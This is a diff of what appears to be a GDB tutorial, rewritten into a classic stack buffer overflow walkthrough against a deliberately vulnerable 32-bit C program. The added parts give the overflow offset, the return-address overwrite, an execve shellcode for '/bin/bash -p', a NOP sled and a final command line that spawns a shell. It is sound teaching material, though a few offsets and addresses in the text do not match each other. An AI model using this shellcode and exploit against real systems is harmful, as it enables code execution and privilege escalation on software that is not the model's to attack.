@@ -10,7 +10,7 @@
     <xmp>
 
 
-# How to analyse statically a program with GDB:
+# Memory analysis with GDB:
 
 ## List of useful tools:
 
@@ -31,7 +31,7 @@ Here is the code that I will use as example for this tutorial:
 
 ```c
 // Author : TiWim
-// Compilation : gcc vulnerable.c -o vulnerable -m32
+// Compilation : gcc vulnerable.c -o vulnerable -m32 -fno-stack-protector -z execstack
 // For any compilation problem, try to install libc6-dev-i386 first
 
 #include <stdio.h>
@@ -69,39 +69,42 @@ __gdb ./vulnerable__
 ```bash
 (gdb) disassemble main
 Dump of assembler code for function main:
-   0x0804844c <+0>: push   ebp
-   0x0804844d <+1>: mov    ebp,esp
-   0x0804844f <+3>: and    esp,0xfffffff0
-   0x08048452 <+6>: sub    esp,0x30
-   0x08048455 <+9>: cmp    DWORD PTR [ebp+0x8],0x2
-   0x08048459 <+13>:    je     0x8048477 <main+43>
-   0x0804845b <+15>:    mov    eax,DWORD PTR [ebp+0xc]
-   0x0804845e <+18>:    mov    eax,DWORD PTR [eax]
-   0x08048460 <+20>:    mov    DWORD PTR [esp+0x4],eax
-   0x08048464 <+24>:    mov    DWORD PTR [esp],0x8048540
-   0x0804846b <+31>:    call   0x8048320 <printf@plt>
-   0x08048470 <+36>:    mov    eax,0xffffffff
-   0x08048475 <+41>:    jmp    0x80484a8 <main+92>
-   0x08048477 <+43>:    mov    eax,DWORD PTR [ebp+0xc]
-   0x0804847a <+46>:    add    eax,0x4
-   0x0804847d <+49>:    mov    eax,DWORD PTR [eax]
-   0x0804847f <+51>:    mov    DWORD PTR [esp+0x4],eax
-   0x08048483 <+55>:    lea    eax,[esp+0x1c]
-   0x08048487 <+59>:    mov    DWORD PTR [esp],eax
-   0x0804848a <+62>:    call   0x8048330 <strcpy@plt>
-   0x0804848f <+67>:    lea    eax,[esp+0x1c]
-   0x08048493 <+71>:    mov    DWORD PTR [esp+0x4],eax
-   0x08048497 <+75>:    mov    DWORD PTR [esp],0x8048555
-   0x0804849e <+82>:    call   0x8048320 <printf@plt>
-   0x080484a3 <+87>:    mov    eax,0x0
-   0x080484a8 <+92>:    leave
-   0x080484a9 <+93>:    ret
+   0x08048414 <+0>:	push   %ebp
+   0x08048415 <+1>:	mov    %esp,%ebp
+   0x08048417 <+3>:	and    $0xfffffff0,%esp
+   0x0804841a <+6>:	sub    $0x30,%esp
+   0x0804841d <+9>:	cmpl   $0x2,0x8(%ebp)
+   0x08048421 <+13>:	je     0x8048440 <main+44>
+   0x08048423 <+15>:	mov    0xc(%ebp),%eax
+   0x08048426 <+18>:	mov    (%eax),%edx
+   0x08048428 <+20>:	mov    $0x8048550,%eax
+   0x0804842d <+25>:	mov    %edx,0x4(%esp)
+   0x08048431 <+29>:	mov    %eax,(%esp)
+   0x08048434 <+32>:	call   0x8048320 <printf@plt>
+   0x08048439 <+37>:	mov    $0xffffffff,%eax
+   0x0804843e <+42>:	jmp    0x8048472 <main+94>
+   0x08048440 <+44>:	mov    0xc(%ebp),%eax
+   0x08048443 <+47>:	add    $0x4,%eax
+   0x08048446 <+50>:	mov    (%eax),%eax
+   0x08048448 <+52>:	mov    %eax,0x4(%esp)
+   0x0804844c <+56>:	lea    0x1c(%esp),%eax
+   0x08048450 <+60>:	mov    %eax,(%esp)
+   0x08048453 <+63>: => call   0x8048330 <strcpy@plt> <=
+   0x08048458 <+68>:	mov    $0x8048565,%eax
+   0x0804845d <+73>:	lea    0x1c(%esp),%edx
+   0x08048461 <+77>:	mov    %edx,0x4(%esp)
+   0x08048465 <+81>:	mov    %eax,(%esp)
+   0x08048468 <+84>:	call   0x8048320 <printf@plt>
+   0x0804846d <+89>:	mov    $0x0,%eax
+   0x08048472 <+94>:	leave  
+   0x08048473 <+95>:	ret    
 End of assembler dump.
 ```
 
 We can notice a call to the vulnerable function at main+62:
+```bash
 0x0804848a <+62>:    call   0x8048330 <strcpy@plt>
-
+```
 
 So, with the command __disas main__ (short for disassemble main), we can see the same code as above but in assembler.
 
@@ -131,22 +134,22 @@ If we didn't read the code because we don't have acces to it, we can still calcu
 
 ```
 (gdb) i r
-eax            0x0  0
-ecx            0xffffd558   -10920
-edx            0xf7fbd360   -134491296
-ebx            0xf7fbbff4   -134496268
-esp            0xffffd5b0   0xffffd5b0
-ebp            0x41414141   0x41414141
-esi            0x0  0
-edi            0x0  0
-eip            0x41414141   0x41414141
-eflags         0x10292  [ AF SF IF RF ]
-cs             0x23 35
-ss             0x2b 43
-ds             0x2b 43
-es             0x2b 43
-fs             0x0  0
-gs             0x63 99
+eax            0x0	0x0
+ecx            0x0	0x0
+edx            0x0	0x0
+ebx            0xb7fcfff4	0xb7fcfff4
+esp            0xbffffc60	0xbffffc60
+ebp            0x41414141	0x41414141
+esi            0x0	0x0
+edi            0x0	0x0
+eip         => 0x41414141 <= 0x41414141
+eflags         0x210286	[ PF SF IF RF ID ]
+cs             0x73	0x73
+ss             0x7b	0x7b
+ds             0x7b	0x7b
+es             0x7b	0x7b
+fs             0x0	0x0
+gs             0x33	0x33
 ```
 
 Here we can see that eip is set to 41414141 and ebp too.
@@ -154,81 +157,94 @@ Here we can see that eip is set to 41414141 and ebp too.
 We will print the stack now:
 ```bash
 (gdb) x/20x $esp-40
-0xffffd588: 0xffffd660  0x41414141  0x41414141  0x41414141
-0xffffd598: 0x41414141  0x41414141  0x41414141  0x41414141
-0xffffd5a8: 0x41414141  0x41414141  0x41414141  0xffffd600
-0xffffd5b8: 0xffffd660  0xf7fde860  0xf7ff4821  0xffffffff
-0xffffd5c8: 0xf7ffcff4  0x0804826f  0x00000001  0xffffd610
+0xbffffc20:	0x08048565	0xbffffc3c	0x08049ff4	0x080484a1
+0xbffffc30:	0xffffffff	0xb7e5ddc6	0xb7fcfff4	0x41414141
+0xbffffc40:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffffc50:	0x41414141	0x41414141	0x41414141  * 0x41414141 *
+0xbffffc60:	0x41414141	0xbffffc00	0xbffffd00	0xb7fdc858
 ```
 
-And the stack pointer vaults 0xffffd5b0
+And the stack pointer values 0xbffffc60
 
 
 
 So, here it seems that we can control simply the execution of the program because we overwrite eip which is the instruction pointer.
 
-We can jump to an arbitrary address.
+We can jump to an arbitrary address:
+
+We printed 40 'A' before and we can see that we have 4 'A' at 0xbffffc60 which is the actual stack pointer. The segfault took place at the address just before : 0xbffffc5c. <br>
+So, we need to decrease the number of 'A' to 32 and add the return address just behind:
+
+```bash
+gdb$ r $(python -c "print 'A' * 32 + '\xef\xbe\xad\xde'")
+Program received signal SIGSEGV, Segmentation fault.
+Cannot access memory at address 0xdeadbeef
+0xdeadbeef in ?? ()
+```
+
+I wrote the address in a strange way. It is because:
+
+    1) It is hexadecimal values
+    2) It is little endian
+
+We control the return address. Can we have a shell now?
+Let us try:
+
+Here is a shellcode:
+
+```bash
+"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"
+```
+
+It executes /bin/bash -p as we can see it just here: 
+
+```bash
+gdb$ r $(python -c "print 'A' * 32 + '\xef\xbe\xad\xde' + '\x90' * 100 + '\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80'")
+Your message: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[..]-phh/bash/bin
+Cannot access memory at address 0xdeadbeef
+0xdeadbeef in ?? ()
+```
+
+So, now the return address:
+
+```
+gdb$ x/50x $esp
+0xbffffbe0:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffffbf0:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffffc00:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffffc10:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffffc20:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffffc30:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffffc40:	0x90909090	0x99580b6a	0x2d686652	0x52e18970
+0xbffffc50:	0x2f68686a	0x68736162	0x6e69622f	0x5152e389
+0xbffffc60:	0xcde18953	0xb7fe0080	0xbffffc6c	0xb7fff918
+0xbffffc70:	0x00000002	0xbffffd82	0xbffffd98	0x00000000
+0xbffffc80:	0xbffffe42	0xbffffe52	0xbffffe5d	0xbffffe7f
+0xbffffc90:	0xbffffe92	0xbffffea8	0xbffffeb4	0xbfffff16
+0xbffffca0:	0xbfffff36	0xbfffff45	0xbfffff54	0xbfffff65
+```
+
+As you can see, there are many \x90 in the stack (I added them just before the shellcode). It corresponds to the instruction "nop" which means no operation.
+The program falls into such instruction, it simply slides to the next instruction.
+That's why we call a chain with many \x90 a nop slide or nop sled.
+It has no effect on the program but it is useful for us if we dont *precisely* know the return address.
+
+We want to jump in the nop slide, let's take an address in that range: 0xbffffc20
+
+```
+r $(python -c "print 'A' * 32 + '\x30\xfc\xff\xbf' + '\x90' * 100 + '\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80'")
+process 6238 is executing new program: /bin/bash
+```
+
+Bingo!
 
 
-
-
-
-
-
-
-
-
-
-
-
-## Software analysis:
-
-First of all:
-we need to execute the command file on the programm to verify that we are legit to disassemble it.
-
-file ./soft
-
-Then, we can run gdb:
-
-gdb -q ./soft
-
-We can disassemble some part of the software with the command disassemble:
-
-disass main
-
-
-
----------------
-
-
-Afficher le contenu de la stack:
-x/24x $esp
-
-
-Afficher une adresse:
-print (void*) $esp
-print (void*) $esp+0x30
-
-Afficher le contenu d'une adresse
-x/x $esp+0x30
-
-jump *adresse
-jump *main+144
-
-stepi
-nexti
-
-br *adresse
-br *main+144
-
-continue c
-run r
-kill ki
-
-watch
-
-- Objdump
-dump d'un fichier binaire en assembleur
+Thanks to the nop slide, we can execute it outside of the debugger:
+```bash
+./vulnerable $(python -c "print 'A' * 32 + '\x30\xfc\xff\xbf' + '\x90' * 100 + '\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80'")
+tiwim@local:~/$ whoami
+tiwimH4cked
+```
 
 </xmp>
 
